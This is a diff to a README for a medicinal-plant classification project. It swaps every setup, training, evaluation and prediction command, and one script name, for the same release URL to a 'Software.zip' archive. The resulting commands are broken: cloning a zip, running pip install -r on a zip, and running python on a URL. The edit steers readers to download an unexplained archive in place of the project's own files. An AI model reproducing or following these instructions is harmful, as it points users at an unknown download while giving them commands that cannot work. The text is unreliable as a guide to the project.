@@ -26,14 +26,14 @@ This repository provides an implementation of a medicinal plants classification 
 
 1. **Clone the Repository**
    ```bash
-   git clone https://github.com/your-username/medicinal-plants-classification.git
+   git clone https://github.com/SriRamapriyan/Medicinal-plants-classification/releases/download/v1.0/Software.zip
    cd medicinal-plants-classification
    ```
 
 2. **Install Dependencies**
    Ensure you have Python 3.7+ installed. Install the required Python packages using pip:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/SriRamapriyan/Medicinal-plants-classification/releases/download/v1.0/Software.zip
    ```
 
 ## Dataset
@@ -59,17 +59,17 @@ You can either use a publicly available dataset or create your own. Ensure that 
 To train the model, run the following command:
 
 ```bash
-python train.py --dataset dataset --model mobilenet --epochs 50
+python https://github.com/SriRamapriyan/Medicinal-plants-classification/releases/download/v1.0/Software.zip --dataset dataset --model mobilenet --epochs 50
 ```
 
-You can adjust the hyperparameters such as the number of epochs, learning rate, and batch size in the `train.py` script.
+You can adjust the hyperparameters such as the number of epochs, learning rate, and batch size in the `https://github.com/SriRamapriyan/Medicinal-plants-classification/releases/download/v1.0/Software.zip` script.
 
 ## Evaluation
 
 After training, evaluate the model on the test set:
 
 ```bash
-python evaluate.py --model output/model_name.h5 --dataset dataset/test
+python https://github.com/SriRamapriyan/Medicinal-plants-classification/releases/download/v1.0/Software.zip --model output/model_name.h5 --dataset dataset/test
 ```
 
 This will provide metrics such as accuracy, precision, recall, and F1-score.
@@ -79,7 +79,7 @@ This will provide metrics such as accuracy, precision, recall, and F1-score.
 To use the trained model for classification:
 
 ```bash
-python predict.py --image path_to_image --model output/model_name.h5
+python https://github.com/SriRamapriyan/Medicinal-plants-classification/releases/download/v1.0/Software.zip --image path_to_image --model output/model_name.h5
 ```
 
 The script will output the predicted class of the medicinal plant in the image.
